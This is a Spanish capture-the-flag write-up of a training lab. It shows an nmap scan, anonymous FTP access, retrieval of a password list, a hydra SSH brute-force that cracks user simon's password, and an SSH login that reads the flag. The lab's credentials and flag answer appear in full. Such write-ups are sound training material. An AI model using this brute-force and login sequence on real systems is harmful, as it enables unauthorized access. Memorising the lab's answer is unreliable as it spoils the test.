
# Lab - Medium

## <mark style="color:purple;">Introducción</mark>

El segundo servidor es un servidor interno (dentro del dominio `inlanefreight.htb`) que administra y almacena correos electrónicos y archivos y sirve como respaldo de algunos de los procesos de la empresa. De conversaciones internas hemos oído que esto se utiliza raramente y, en la mayoría de los casos, hasta ahora sólo se ha utilizado con fines de prueba.

> Evalúa el servidor de destino y obtén el contenido del archivo flag.txt. Envíalo como respuesta.

***

## <mark style="color:purple;">Escaneo de puertos</mark>

```bash
sudo nmap -v -sV -p- 10.129.201.127

PORT       STATE     SERVICE        VERSION
22/tcp     open      ssh            OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)
53/tcp     open      domain         ISC BIND 9.16.1 (Ubuntu Linux)
110/tcp    open      pop3           Dovecot pop3d
995/tcp    open      ssl/pop3       Dovecot pop3d
30021/tcp  open      ftp
```

Encontramos 5 puertos abiertos, y vemos que en este host el servicio FTP se ejecuta en el puerto **30021** en vez del puerto 21 que se suele utilizar para FTP.

```
30021/tcp open  ftp
```

## <mark style="color:purple;">Acceso a FTP</mark>

Probamos a acceder con login `anonymous` y conseguimos acceder correctamente:

```shell-session
afsh4ck@kali$ ftp 10.129.14.176 30021
Connected to 10.129.14.176.
220 ProFTPD Server (Internal FTP) [10.129.14.176]
Name (10.129.14.176:kali): anonymous
331 Anonymous login ok, send your complete email address as your password
Password: 
230 Anonymous access granted, restrictions apply
Remote system type is UNIX.
Using binary mode to transfer files.
ftp>
```

Al enumerar los archivos encontramos una carpeta `simon`, que es el único usuario de este sistema, y encontramos un archivo de notas que vamos a descargar en local:

```bash
ftp> ls
229 Entering Extended Passive Mode (|||59483|)
150 Opening ASCII mode data connection for file list
drwxr-xr-x   2 ftp      ftp          4096 Apr 18  2022 simon
226 Transfer complete
ftp> cd simon
250 CWD command successful
ftp> ls
229 Entering Extended Passive Mode (|||50226|)
150 Opening ASCII mode data connection for file list
-rw-rw-r--   1 ftp      ftp           153 Apr 18  2022 mynotes.txt
226 Transfer complete
ftp> get mynotes.txt
local: mynotes.txt remote: mynotes.txt
229 Entering Extended Passive Mode (|||42036|)
150 Opening BINARY mode data connection for mynotes.txt (153 bytes)
100% |***************************************|   153      209.55 KiB/s    00:00 ETA
226 Transfer complete
153 bytes received in 00:00 (2.49 KiB/s)
ftp> 
```

El archivo `mynotes.txt` contiene lo que parecen contraseñas para acceder al sistema:

```bash
cat mynotes.txt                                       
───────┬────────────────────────────────────────────────────────────────────────────
       │ File: mynotes.txt
───────┼────────────────────────────────────────────────────────────────────────────
   1   │ 234987123948729384293
   2   │ +23358093845098
   3   │ ThatsMyBigDog
   4   │ Rock!ng#May
   5   │ Puuuuuh7823328
   6   │ 8Ns8j1b!23hs4921smHzwn
   7   │ 237oHs71ohls18H127!!9skaP
   8   │ 238u1xjn1923nZGSb261Bs81
```

Entonces ya tenemos el usuario simon y la lista de contraseñas, por lo que vamos a hacer bruteforce al servicio SSH para ganar acceso al servidor.

## <mark style="color:purple;">Bruteforce de SSH</mark>

```shell-session
afsh4ck@kali$ hydra -l simon -P mynotes.txt -f 10.129.14.176 ssh  
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-05-06 19:19:17
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 8 tasks per 1 server, overall 8 tasks, 8 login tries (l:1/p:8), ~1 try per task
[DATA] attacking ssh://10.129.14.176:22/
[22][ssh] host: 10.129.14.176   login: simon   password: 8Ns8j1b!23hs4921smHzwn
[STATUS] attack finished for 10.129.14.176 (valid pair found)
```

Buum! Obtenemos la contraseña del usuario simon para acceder por SSH

## <mark style="color:purple;">Acceso por SSH</mark>

```bash
ssh simon@10.129.14.176

Last login: Wed Apr 20 14:32:33 2022 from 10.10.14.20
simon@lin-medium:~$ ls
flag.txt  Maildir
simon@lin-medium:~$ cat flag.txt 
HTB{1qay2wsx3EDC4rfv_M3D1UM}
```

Conseguimos acceder correctamente y nos hacemos con la flag!
